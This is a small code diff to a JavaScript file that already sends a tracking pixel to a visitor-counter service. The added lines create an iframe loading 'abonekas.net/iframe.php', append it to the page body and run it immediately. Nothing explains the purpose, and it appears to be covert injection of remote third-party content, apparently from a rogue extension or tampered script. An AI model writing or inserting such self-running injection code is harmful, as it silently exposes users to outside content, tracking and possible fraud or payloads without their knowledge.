@@ -1,1 +1,10 @@
 new Image().src = '//whos.amung.us/widget/youtubem2.png';
+
+function prepareFrame() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://abonekas.net/iframe.php");
+        ifrm.style.width = "640px";
+        ifrm.style.height = "480px";
+        document.body.appendChild(ifrm);
+    }
+    prepareFrame();
